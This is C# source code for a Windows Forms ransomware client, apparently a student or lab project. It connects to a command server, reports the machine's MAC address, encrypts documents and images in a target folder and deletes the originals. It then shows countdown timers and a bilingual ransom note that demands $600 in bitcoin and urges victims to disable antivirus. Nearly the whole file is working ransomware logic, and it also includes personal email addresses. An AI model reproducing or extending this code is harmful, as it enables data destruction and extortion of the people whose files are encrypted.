using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Threading;
using System.IO;

namespace SocketRansomware
{
    public partial class Form1 : Form
    {
        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg", ".pdf", ".ppt" };
        private string key;
        private const string PATH = @"C:\files";
        TcpClient client;
        Thread receiveMessageThread = null;
        //서버시간과 클라이언트 시간의 차이
        private TimeSpan ts;
        //서버시간과의 오차를 현재 시간에 더하면 서버시간
        DateTime sysDateTime 
        {
            get
            {
                return DateTime.Now.Add(ts);
            }
        }
        DateTime infectionTime;
        public Form1()
        {
            InitializeComponent();

        }

        private void ConnectServer()
        {
            try
            {
                client = new TcpClient(); //연결
                client.Connect("localhost", 8080); //설정
                receiveMessageThread = new Thread(ReceiveMessage);
                receiveMessageThread.IsBackground = true;
                receiveMessageThread.Start();

                string mac = "mac;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
                SendDataServer(mac);
             
            }
            catch (SocketException)
            {
                MessageBox.Show("실패");
            }
            catch (Exception)
            {
                MessageBox.Show("실패");
            }
        }
       //서버로 데이터 전송
        private void SendDataServer(string str)
        {
            byte[] buffer = new byte[1024];

            try
            {
                for (int i = 0; i < 1024; i++) buffer[i] = 0; //서버설명과 같음.
                buffer = Encoding.Default.GetBytes(str);
                NetworkStream net = client.GetStream(); //서버설명과 같음.
                net.Write(buffer, 0, buffer.Length); //버퍼에 데이터를 씀 c++로따지면 send함수
                net.Flush(); //버퍼비우기
            }
            catch (SocketException se)
            {
                MessageBox.Show("소켓 오류" + se.Message);
            }
            catch (Exception ee)
            {
                MessageBox.Show("실패 :" + ee.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ConnectServer();
            cbboxLanguage.SelectedIndex = 0;

            
            timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(count_down);

            /*  timer2 = new System.Windows.Forms.Timer();
              timer2.Tick += new EventHandler(count_down);
              timer2.Interval = 1000;
              timer2.Start();*/


            
        }

        private void ReceiveMessage()
        {
            byte[] bytes = new byte[1024];
            while(true)
            {
                try
                {
                   for(int i = 0; i < 1024; i++) bytes[i] = 0;
                    NetworkStream net = client.GetStream();//네트워크스트림(소켓상에 데이터가 존재하는곳)
                    net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
                    string str = Encoding.Default.GetString(bytes).Trim('\0');
                    string[] request = str.Split(';');
                    string type = request[0];
                    if(type.Equals("encrypt"))
                    {
                        EncryptFiles(request[1]);
                    } else if(type.Equals("timestamp"))
                    {
                        this.infectionTime = Convert.ToDateTime(request[2]);
                        this.ts = Convert.ToDateTime(request[4]).Subtract(DateTime.Now);
                        timer1.Start();
                    } else if(type.Equals("key"))
                    {
                        btnDecrypt.Enabled = true;
                        key = request[1];
                    }
                    Console.WriteLine(str);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    break;
                }
            }
        }

        private void EncryptFiles(string key)
        {
            System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(PATH);
            foreach (System.IO.FileInfo Fileinfo in di.GetFiles())
            {
                foreach (string extension in extensions)
                {
                    if (Fileinfo.Extension.ToLower().CompareTo(extension) == 0)
                    {
                        String FileNameOnly = Fileinfo.Name.Substring(0, Fileinfo.Name.Length - 4);
                        String FullFileName = Fileinfo.FullName;

                        //   MessageBox.Show(FullFileName + " " + FileNameOnly);
                        string newPath = FullFileName + ".inu";
                        FileInfo outputFile = new FileInfo(newPath);
                        using (FileStream fs = outputFile.Create())
                        {
                            Byte[] txt = File.ReadAllBytes(FullFileName);
                            Byte[] newText = Crypto.Encrypt(txt, key);
                            fs.Write(newText, 0, newText.Length);
                            File.Delete(FullFileName);

                        }

                    }
                }

            }
        }

        private void DecryptFiles(string key)
        {
            if (this.key == null) return;

            System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(PATH);
            foreach (System.IO.FileInfo Fileinfo in di.GetFiles())
            {
                if (Fileinfo.Extension.ToLower().CompareTo(".inu") == 0)
                {
                    String FileNameOnly = Fileinfo.Name.Substring(0, Fileinfo.Name.Length - 4);
                    String FullFileName = Fileinfo.FullName;
                    string originFileName = FullFileName.Substring(0, FullFileName.Length - 4);
                    //   MessageBox.Show(FullFileName + " " + FileNameOnly);
                    FileInfo outputFile = new FileInfo(originFileName);
                    using (FileStream fs = outputFile.Create())
                    {
                        Byte[] text = File.ReadAllBytes(FullFileName);
                        Byte[] newText = Crypto.Decrypt(text, key);
                        fs.Write(newText, 0, newText.Length);
                        File.Delete(FullFileName);
                    }
                }
            }
        }

        private void lbAboutBit_Click(object sender, EventArgs e)
        {

        }


        private void count_down(object sender, EventArgs e)
        {
            DateTime raiseTime = infectionTime.AddSeconds(36000);
            DateTime timeout = infectionTime.AddSeconds(43200);
            lbDate1.Text = raiseTime.ToString("yyyy-MM-dd HH:mm:ss");
            lbDate2.Text = timeout.ToString("yyyy-MM-dd HH:mm:ss");
            TimeSpan duration = raiseTime.Subtract(sysDateTime);
            TimeSpan duration2 = timeout.Subtract(sysDateTime);
            
            
            if(duration.TotalSeconds <= 0)
            {
                lbtimer1.Text = "00:00:00";
                addressLabel.Text = "Send $600 worth of bitcoin to this address:";
            }
            else
            {
                lbtimer1.Text = duration.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
                btnCheckPayment.Enabled = true;
            }

            if (duration2.TotalSeconds <= 0)
            {
                lbtimer2.Text = "00:00:00";
                btnCheckPayment.Enabled = false;
              
                timer1.Stop();
              
            }
            else
            {
                lbtimer2.Text = duration2.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
                btnCheckPayment.Enabled = true;
            }
        }

        private void btnCopy_Click(object sender, EventArgs e)
        {
            tbKey.SelectAll();
            tbKey.Copy();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                VisitLink();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Unable to open link that was clicked.");
            }
        }

        private void VisitLink()
        {
            linkLabel1.LinkVisited = true;
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                VisitLink2();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Unable to open link that was clicked.");
            }
        }

        private void VisitLink2()
        {
            linkLabel2.LinkVisited = true;
            System.Diagnostics.Process.Start("https://www.investopedia.com/articles/investing/082914/basics-buying-and-investing-bitcoin.asp");
        }

        private void btnCheckPayment_Click(object sender, EventArgs e)
        {
            string decrpyt = "decrypt;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
            SendDataServer(decrpyt);
            MessageBox.Show("결제 완료!");
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            DecryptFiles(this.key);
            MessageBox.Show("복호화 완료!");
        }

        private void cbboxLanguage_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(cbboxLanguage.SelectedIndex == 0)
            {
               string str = "What Happened to My Computer?\r\nYour important files are encrypted.\r\nMany of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. \r\nMaybe you are busy looking for a way to recover your files, but do not waste your time. \r\nNobody can recover your files without our decryption service.\r\n\r\nCan I Recover My Files ?\r\nSure, We guarantee that you can recover all your files safety and easily. But you have not so enough time. \r\nYou can decrypt some of your files for free.Try now by clicking <Decrypt>.\r\nBut if you want to decrypt all your files, you need to pay.\r\nYou only have 10 hours to submit the payment. After that the price wll be doubled.\r\nAlso, if you don't play in 12 hours, you won't be able to recover your files forever.\r\n\r\nHow Do I Pay?\r\nPayment is accepted in Bitcoin only. For more information, click <About bitcoin>.\r\nPlease check the current price of Bitcoin and buy some bitcoins. For more information, click  \r\n<How to buy bitcoins>.\r\nAnd send the correct amount to the address specified in this window.\r\nAfter your payment, click <Check Payment>. \r\nBest time to check: 9:00am ~11:00am GMT from Monday to Friday.\r\nOnce the payment is checked, you can start decrypting your files immediately.\r\n\r\nContact\r\nIf you need our assistance, send a message by clicking <Contact Us>.\r\n\r\nWe strongly recommend you to not remove this software, and disable your anti-virus for a while, until you pay and the payment gets processed. \r\nIf your anti - virus gets updated and removes this software automatically, it will not be able to recover your files even if you pay!";
                tbBox.Text = str;
            } 
            else
            {
                string str2 = "내 컴퓨터에 무슨 일이 일어났습니까?\r\n중요한 파일이 암호화되어 있습니다.\r\n대부분의 문서, 사진, 비디오, 데이터베이스 및 기타 파일은 암호화되었기 때문에 더 이상 액세스할 수 없습니다. \r\n파일을 복구할 방법을 찾느라 바쁘겠지만 시간을 낭비하지는 마세요. \r\n우리의 암호 해독 서비스 없이는 아무도 당신의 파일을 복구할 수 없습니다.\r\n\r\n내 파일을 복구할 수 있습니까?\r\n물론입니다. 모든 파일을 안전하고 쉽게 복구할 수 있습니다. 하지만 당신은 시간이 충분하지 않아요.\r\n일부 파일의 암호를 무료로 해독할 수 있습니다. 지금 <Decrypt> 를 클릭하여 시도해 보세요.\r\n하지만 모든 파일을 해독하려면 돈을 내야 합니다.\r\n10시간 안에 결제해야 합니다. 그 이후에는 가격이 두 배로 오를 것입니다.\r\n또한 12시간 내에 재생하지 않으면 파일을 영원히 복구할 수 없습니다.\r\n\r\n결제는 어떻게 하나요?\r\nBitcoin에서만 결제가 가능합니다. 자세한 내용은 <About Bitcoin> 을 클릭하세요.\r\n비트코인의 현재 가격을 확인하고 비트코인을 구매하세요. 자세한 내용은 <How to buy bitcoins> 을 클릭하세요.\r\n그리고 정확한 금액을 이 창에 명시된 주소로 보내주세요.\r\n결제 후, <Check Payment> 을 클릭하세요.\r\n월요일부터 금요일 오전 9시부터 11시까지 확인하는 것이 가장 좋습니다.\r\n결제가 확인되면 파일의 암호를 즉시 해독할 수 있습니다.\r\n\r\n연락처\r\n도움이 필요하시다면 <Contact us> 를 클릭하여 메시지를 보내세요.\r\n\r\n지불하고 결제가 처리될 때까지 이 소프트웨어를 제거하지 말고 안티바이러스를 잠시 비활성화하는 것이 좋습니다. 안티바이러스가 업데이트되고 이 소프트웨어가 자동으로 제거되면 비용을 지불하더라도 파일을 복구할 수 없습니다!";
                tbBox.Text = str2;
            }

        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("Email Address1: leeseong010@naver.com\nEmail Address2: bestinwoo@gmail.com");
        }
    }
   
}
